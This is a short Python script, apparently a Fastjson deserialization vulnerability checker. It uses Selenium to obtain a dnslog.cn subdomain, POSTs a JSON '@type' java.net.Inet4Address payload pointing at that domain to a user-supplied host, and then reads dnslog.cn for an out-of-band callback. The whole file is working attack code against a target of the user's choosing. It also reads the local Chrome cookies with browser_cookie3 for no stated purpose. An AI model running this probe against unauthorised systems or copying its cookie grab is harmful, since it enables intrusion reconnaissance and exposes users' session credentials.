import requests
from selenium.webdriver import Chrome
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
import time
import browser_cookie3

def verify(dnslog):
    time.sleep(5)
    driver.find_element(By.XPATH, '//*[@id="content"]/button[2]').click()
    time.sleep(5)
    ver = driver.find_element(By.XPATH, '//*[@id="myRecords"]/tbody/tr[2]/td[1]')
    re = dnslog
    flag = re in str(ver.text)

    if flag:
        print("It looks likely vulnerable")
    else:
        print("It is strong")

def exploit(url,dns):
    cookie = browser_cookie3.chrome()
    dnslog = driver.find_element(By.XPATH, '//*[@id="myDomain"]').text
    payload = '{"a":{"@type":"java.net.Inet4Address","val":"%s"}}'%(dnslog)
    response = requests.post(url=url,data=payload)
    if response.status_code == 200:
        verify(dnslog)

if __name__ == '__main__':
    url = 'http://' + input('Please input your ip:port(such as--127.0.0.1:80):')
    driver = Chrome()
    driver.get("http://www.dnslog.cn/")
    WebDriverWait(driver, 10).until(lambda d: "DNSLog" in d.title)
    driver.find_element(By.XPATH, '//*[@id="content"]/button[1]').click()
    time.sleep(5)
    dns = driver.find_element(By.XPATH, '//*[@id="myDomain"]')

    exploit(url,dns.text)
